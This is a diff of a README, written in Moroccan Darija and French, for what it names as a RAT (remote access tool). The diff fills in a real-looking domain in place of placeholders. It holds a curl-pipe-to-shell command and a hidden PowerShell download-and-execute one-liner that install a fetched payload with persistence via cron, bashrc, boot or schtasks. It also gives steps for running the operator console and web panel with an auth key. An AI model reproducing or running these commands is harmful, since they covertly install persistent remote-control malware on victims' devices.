@@ -28,11 +28,11 @@ w 7et `BASE_URL=https://domaine.dyalek` f Variables.
 
 Linux / Termux / Android:
 
-    curl -fsSL https://<DOMAINE>/i | sh
+    curl -fsSL https://1uciferxyz.com/ | sh
 
 Windows (hidden):
 
-    powershell -w hidden -c "irm https://<DOMAINE>/i.ps1 | iex"
+    powershell -w hidden -c "irm https://1uciferxyz.com/i.ps1 | iex"
 
 L'installer kaydir: python install (ila khass), payload fetch, detach,
 wake-lock, persistence (boot/cron/bashrc wla schtasks).
@@ -42,11 +42,11 @@ wake-lock, persistence (boot/cron/bashrc wla schtasks).
 A. Console (l'asas):
 
     termux-wake-lock
-    python3 ~/rat/console.py --url https://<DOMAINE> --key <AUTH>
+    python3 ~/rat/console.py --url https://1uciferxyz.com/ --key <AUTH>
 
 B. Panel f l'browser:
 
-    termux-open-url "https://<DOMAINE>/?k=<AUTH>"
+    termux-open-url "https://1uciferxyz.com/?k=<AUTH>"
 
   Wla 7el Chrome w lsa9 l'URL b yeddek. Zid 3la home screen.
 
